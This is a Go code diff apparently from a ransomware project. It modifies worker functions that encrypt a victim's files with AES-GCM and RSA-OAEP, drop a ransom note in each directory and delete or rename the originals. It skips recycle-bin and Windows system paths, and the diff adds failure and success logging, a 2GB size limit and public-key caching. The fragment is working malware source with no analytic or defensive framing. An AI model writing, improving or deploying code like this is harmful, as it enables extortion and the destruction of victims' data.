 	if log != nil {
 		defer func() { _ = log.Close() }()
@@ -448,13 +1094,20 @@ func runEncryptionWorkers(files []string, numWorkers int, stats *counters, outUU
 					notePath := filepath.Join(dirPath, ransomNoteFileName)
 					_ = os.WriteFile(notePath, []byte(finalAccurateNote), 0644)
 				}
-				if err := processFile(file, resp.PublicKeyPEM, removeOriginal); err != nil {
+				if err := processFile(file, publicKeyPEM, removeOriginal); err != nil {
 					stats.failed.Add(1)
+
+					// 记录失败日志
+					logFailed(file, err.Error())
+
 					if log != nil {
 						log.Log(fmt.Sprintf("FAILED: %s - %v", file, err))
 					}
 				} else {
 					stats.success.Add(1)
+
+					// 记录成功日志
+					logSuccess(file)
 				}
 			}
 		}()
@@ -487,6 +1140,12 @@ func runEncryptionWorkers(files []string, numWorkers int, stats *counters, outUU
 	wg.Wait()
 	close(done)
 	fmt.Println()
+
+	*outUUID = uuid
+
+	if logEnabled {
+		logOperation(fmt.Sprintf("加密工作完成: 成功 %d, 失败 %d", stats.success.Load(), stats.failed.Load()))
+	}
 }
 
 func fetchKeysFromAPI() (*APIResponse, error) {
@@ -529,7 +1188,7 @@ func isExcluded(path string) bool {
 			return true
 		}
 	}
-	return strings.Contains(pathLower, "$recycle.bin")
+	return strings.Contains(pathLower, "$recycle.bin") || strings.Contains(pathLower, "\\windows\\")
 }
 
 func shouldEncrypt(filePath string, extFilter map[string]bool) bool {
@@ -546,24 +1205,38 @@ func getKeys(m map[string]bool) []string {
 }
 
 func processFile(filePath string, publicKeyStr string, removeOriginal bool) error {
+	// 跳过超大文件（超过2GB）
+	if info, err := os.Stat(filePath); err == nil {
+		if info.Size() > 2*1024*1024*1024 { // 2GB
+			return fmt.Errorf("文件过大，跳过加密: %s (大小: %.2f GB)",
+				filePath, float64(info.Size())/(1024*1024*1024))
+		}
+	}
+
 	_ = os.Chmod(filePath, 0666)
 	content, err := os.ReadFile(filePath)
 	if err != nil {
-		return fmt.Errorf("read failed: %w", err)
+		return fmt.Errorf("读取文件失败: %w", err)
 	}
+
+	// 检查文件是否为空
+	if len(content) == 0 {
+		return fmt.Errorf("文件为空，跳过加密: %s", filePath)
+	}
+
 	encryptedContent, err := hybridEncrypt(content, publicKeyStr)
 	if err != nil {
-		return fmt.Errorf("hybridEncrypt failed: %w", err)
+		return fmt.Errorf("混合加密失败: %w", err)
 	}
 	encryptedFilePath := filePath + ".encrypted"
 	if err := os.WriteFile(encryptedFilePath, encryptedContent, 0666); err != nil {
-		return fmt.Errorf("write encrypted failed: %w", err)
+		return fmt.Errorf("写入加密文件失败: %w", err)
 	}
 	if removeOriginal {
 		if err := os.Remove(filePath); err != nil {
 			trashName := filePath + ".delete_me_" + generateRandomSuffix()
 			if renameErr := os.Rename(filePath, trashName); renameErr != nil {
-				return fmt.Errorf("remove failed (locked): %w", err)
+				return fmt.Errorf("删除原文件失败 (文件被锁定): %w", err)
 			}
 		}
 	}
@@ -577,6 +1250,12 @@ func generateRandomSuffix() string {
 }
 
 func hybridEncrypt(plaintext []byte, publicKeyStr string) ([]byte, error) {
+	// 获取公钥（使用缓存）
+	pubKey, err := getPublicKey(publicKeyStr)
+	if err != nil {
+		return nil, fmt.Errorf("获取公钥失败: %w", err)
+	}
+
 	aesKey := make([]byte, 32)
 	if _, err := io.ReadFull(rand.Reader, aesKey); err != nil {
 		return nil, fmt.Errorf("生成AES密钥失败: %w", err)
@@ -599,21 +1278,7 @@ func hybridEncrypt(plaintext []byte, publicKeyStr string) ([]byte, error) {
 
 	ciphertext := aesGCM.Seal(nil, nonce, plaintext, nil)
 
-	pemBlock, _ := pem.Decode([]byte(publicKeyStr))
-	if pemBlock == nil {
-		return nil, fmt.Errorf("解码PEM公钥失败")
-	}
-
-	pub, err := x509.ParsePKIXPublicKey(pemBlock.Bytes)
-	if err != nil {
-		return nil, fmt.Errorf("解析PKIX公钥失败: %w", err)
-	}
-	rsaPubKey, ok := pub.(*rsa.PublicKey)
-	if !ok {
-		return nil, fmt.Errorf("公钥不是RSA类型")
-	}
-
-	encryptedAESKey, err := rsa.EncryptOAEP(sha256.New(), rand.Reader, rsaPubKey, aesKey, nil)
+	encryptedAESKey, err := rsa.EncryptOAEP(sha256.New(), rand.Reader, pubKey, aesKey, nil)
 	if err != nil {
 		return nil, fmt.Errorf("RSA加密AES密钥失败: %w", err)
 	}
